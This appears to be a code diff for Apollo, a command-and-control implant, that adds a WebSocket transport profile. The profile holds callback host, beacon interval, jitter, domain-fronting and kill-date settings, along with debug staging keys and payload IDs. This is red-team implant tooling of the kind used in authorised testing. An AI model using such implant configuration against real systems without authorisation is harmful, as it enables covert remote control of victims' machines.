@@ -14,6 +14,9 @@ using System.Text;
 using ApolloInterop.Structs.ApolloStructs;
 using PSKCryptography;
 using ApolloInterop.Serializers;
+#if WEBSOCKET
+using WebsocketTransport;
+#endif
 #if SMB
 using NamedPipeTransport;
 #endif
@@ -66,6 +69,42 @@ namespace Apollo
                 }
             },
 #endif
+#if WEBSOCKET
+            { "websocket", new C2ProfileData()
+                {
+                    TC2Profile = typeof(WebsocketProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "tasking_type", "Push" },
+                        { "callback_interval", "5" },
+                        { "callback_jitter", "0" },
+                        { "callback_port", "8081" },
+                        { "callback_host", "ws://mythic" },
+                        { "ENDPOINT_REPLACE", "socket" },
+                        { "encrypted_exchange_check", "T" },
+                        { "domain_front", "domain_front" },
+                        { "killdate", "-1" },
+                        { "USER_AGENT", "Apollo-Refactor" },
+#else
+                        { "tasking_type", "tasking_type_here"},
+                        { "callback_interval", "callback_interval_here" },
+                        { "callback_jitter", "callback_jitter_here" },
+                        { "callback_port", "callback_port_here" },
+                        { "callback_host", "callback_host_here" },
+                        { "ENDPOINT_REPLACE", "ENDPOINT_REPLACE_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+                        { "domain_front", "domain_front_here" },
+                        { "USER_AGENT", "USER_AGENT_here" },
+                        { "killdate", "killdate_here" },
+                        HTTP_ADDITIONAL_HEADERS_HERE
+#endif
+                    }
+                }
+            },
+#endif
 #if SMB
             { "smb", new C2ProfileData()
                 {
@@ -103,13 +142,15 @@ namespace Apollo
                 }
             }
 #endif
-                    };
+        };
 
 
         public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
 #if DEBUG
 #if HTTP
         public static string StagingRSAPrivateKey = "ejezYqXCDzFUWbgyJ7BMVqCKfi02jOGUx4ZtAc1rllM=";
+#elif WEBSOCKET
+        public static string StagingRSAPrivateKey = "TYSeN+dDzfg+pJoziRsxgMQrkmura3cGAB84Jwyv4xY=";
 #elif SMB
         public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
 #elif TCP
@@ -117,6 +158,8 @@ namespace Apollo
 #endif
 #if HTTP
         public static string PayloadUUID = "084ece5f-7130-4a5a-81af-55e332802751";
+#elif WEBSOCKET
+        public static string PayloadUUID = "f4d26e36-b6e6-4c3d-a82a-856750a7f681";
 #elif SMB
         public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
 #elif TCP
